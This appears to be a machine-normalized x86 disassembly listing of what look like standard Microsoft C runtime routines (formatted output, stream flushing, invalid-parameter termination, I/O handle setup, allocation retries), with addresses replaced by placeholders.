push esi
call sub_4135c9
lea eax [ eax * 2 + rwxdata ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_4134fc
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_413487
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_41331b
add esp 0xc
jmp r-xdata
sub_40d4fd
push 0x3
call sub_413647
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40d34e
push 0xff
call sub_40d34e
pop ecx
pop ecx
push 0x3
call sub_413647
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rwxdata ] 0x1
jne r-xdata
sub_40d545
mov edi edi
push ebp
mov ebp esp
push esi
push 0x4
call sub_40f40a
pop ecx
push [ rwxdata ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ EncodePointer@IAT ]
push 0x4
mov [ rwxdata ] eax
call sub_40f319
pop ecx
mov eax esi
pop esi
pop ebp
retn
sub_40d592
mov edi edi
push ebp
mov ebp esp
push [ rwxdata ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_40d6cd
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_410551
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_40d1fa
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_40d1fa
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_40bf8a
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_410fa5
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_41384d
pop ecx
test eax eax
jne r-xdata
call sub_40bf8a
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_410fa5
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_413804
pop ecx
pop edi
mov eax rwxdata
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_41371a
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rwxdata ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_40d831
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_41258b
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rwxdata ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rwxdata ]
je r-xdata
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_414285
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_413ac6
mov [ esi + 0x4 ] eax
sub_40d8c9
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40d6cd
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_40d8fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_40d8c9
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_40d922
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_40d8c9
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_40d1fa
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_40d8c9
sub_40d9a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x238 ] eax
call sub_40d831
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_410551
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
xor ecx ecx
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
sub_40e564
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_4105f0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_41327d
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_41327d
pop ecx
sub_40e68d
mov edi edi
push ebp
mov ebp esp
push esi
push [ rwxdata ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
mov eax esi
pop esi
pop ebp
retn
sub_40e6c1
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40e564
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_40e700
mov edi edi
push ebp
mov ebp esp
push [ rwxdata ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e6c1
int3
pop ebp
jmp eax
sub_40e73d
xor eax eax
push esi
push eax
push eax
push eax
push eax
push eax
call sub_40e700
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40e564
add esp 0x20
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
int3
sub_40e776
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
leave
retn
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_40d9a9
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40d6cd
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_40e814
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push 0x7
xor edx edx
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] edx
[ edi ]
pop edi
cmp [ ebp + 0xc ] edx
jne r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] 0x7fffffff
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
push eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x20 ] edx
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
leave
retn
sub_40e8e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40d6cd
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_40e9ac
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_40e8e2
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40e9d5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40d9a9
call sub_40e8e2
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40e9ff
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
pop ebp
retn
call sub_40d1fa
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_40e72d
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_415dbd
call sub_40e8e2
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_40d1fa
mov [ eax ] 0x22
sub_40ea93
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test ebx ebx
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
pop ebp
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
call sub_40e72d
call sub_40d1fa
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
cmp edi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax ]
push edi
push esi
push sub_415dbd
call sub_40e8e2
add esp 0x18
mov [ esi + edi - 0x1 ] 0x0
cmp eax 0xfffffffe
jne r-xdata
mov edi [ eax ]
inc ebx
push ebx
push esi
push sub_415dbd
call sub_40e8e2
add esp 0x18
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
jns r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_40d1fa
cmp [ eax ] 0x22
jne r-xdata
mov [ esi ] 0x0
cmp eax 0xfffffffe
jne r-xdata
call sub_40d1fa
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_40d1fa
mov [ eax ] edi
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0x22
call sub_40d1fa
mov [ eax ] ebx
jmp r-xdata
sub_40eb7f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ea93
add esp 0x18
pop ebp
retn
sub_40eb9f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_414a2b
call sub_40e8e2
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40ebc8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_414a2b
call sub_40e8e2
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40ebf2
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_40ef0a
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rwxdata ] eax
mov [ rwxdata ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rwxdata ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rwxdata ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rwxdata
mov esi ebx
shl esi 0x6
add esi [ rwxdata ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rwxdata ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rwxdata ]
add [ rwxdata ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rwxdata ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_40ef0a
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rwxdata ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_40ee37
mov edi edi
push esi
push edi
mov edi rwxdata
add edi 0x4
cmp edi rwxdata
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_40b955
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_40ee8a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ Sleep@IAT ]
add esi 0x3e8
cmp esi [ rwxdata ]
jbe r-xdata
mov eax esi
pop esi
pop ebp
retn
or esi 0xffffffff
sub_40eec5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_40b9ce
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40ef0a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41698d
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40ef56
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416a0f
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_40efa4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416abc
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40eff6
push 0x10
push r--data
call sub_40f510
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f089
mov eax [ ebp - 0x1c ]
call sub_40f555
retn
mov esi edi
mov eax [ rwxdata ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rwxdata ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40caef
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
call sub_40b955
pop ecx
mov eax [ rwxdata ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40f092
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_410551
pop ecx
push eax
call sub_410fa5
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40f0fa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40f092
pop ecx
test eax eax
je r-xdata
push esi
call sub_40f142
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_410551
push eax
call sub_416b2a
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40f142
push 0x14
push r--data
call sub_40f510
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f213
